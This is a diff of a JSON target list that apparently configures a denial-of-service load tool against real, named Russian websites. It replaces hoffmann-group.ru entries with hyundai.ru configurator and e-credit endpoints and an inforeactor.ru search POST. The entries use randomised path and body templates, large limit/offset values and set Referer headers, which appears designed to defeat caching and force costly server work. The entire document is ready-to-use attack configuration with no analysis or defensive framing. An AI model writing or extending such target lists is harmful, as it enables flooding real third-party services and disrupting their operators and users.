@@ -1,35 +1,29 @@
 {
   "targets": [
     {
-      "target": "https://mail.hoffmann-group.ru:9443",
-      "method": "GET",
+      "target": "https://www.hyundai.ru",
+      "method": "HTTP_TEMPLATE",
       "options": {
-        "headers": "{\"Referer\": \"https://hoffmann-group.ru/\"}",
-        "path_qs": "/cart"
+        "headers": "{\"Referer\": \"https://www.hyundai.ru/\"}",
+        "path_qs": "/configurator/car/{{int(1,40)}}/summary"
       }
     },
     {
-      "target": "https://mail.hoffmann-group.ru:9443",
+      "target": "https://api.configurator.hyundai.ru",
       "method": "HTTP_TEMPLATE",
       "options": {
-        "headers": "{\"Referer\": \"https://hoffmann-group.ru/\"}",
-        "path_qs": "/search?q={{int(1,9)}}&limit=1000&offset={{int(0,1000)}}"
+        "headers": "{\"Referer\": \"https://www.hyundai.ru/\"}",
+        "path_qs": "/ecredit/car/{{int(1,40)}}"
       }
     },
     {
-      "target": "https://hoffmann-group.ru",
+      "target": "https://inforeactor.ru",
       "method": "HTTP_TEMPLATE",
       "options": {
-        "headers": "{\"Referer\": \"https://hoffmann-group.ru/\"}",
-        "path_qs": "/collection/all?order=descending_age&page={{int(1,1401)}}"
-      }
-    },
-    {
-      "target": "https://hoffmann-group.ru",
-      "method": "HTTP_TEMPLATE",
-      "options": {
-        "headers": "{\"Referer\": \"https://hoffmann-group.ru/\"}",
-        "path_qs": "/products_by_id/{{int(162532719,313854181)}},{{int(162532719,313854181)}},{{int(162532719,313854181)}},{{int(162532719,313854181)}},{{int(162532719,313854181)}},{{int(162532719,313854181)}},{{int(162532719,313854181)}},{{int(162532719,313854181)}},{{int(162532719,313854181)}},{{int(162532719,313854181)}}.json"
+        "body": "{\"query\":\"{{str(1)}} {{str(1)}}\",\"options\":{\"full\":true,\"limit\":{{int(1,1000)}},\"offset\":{{int(1,1000)}},\"maxDate\":16657520267,\"type\":\"byDate\",\"days\":\"365\",\"categories\":[],\"fields\":[\"title\",\"data\"]}}",
+        "headers": "{\"Content-Type\": \"application/json\", \"Referer\": \"https://inforeactor.ru/search\"}",
+        "path_qs": "/html/searchPosts/render/",
+        "verb": "POST"
       }
     },
     {
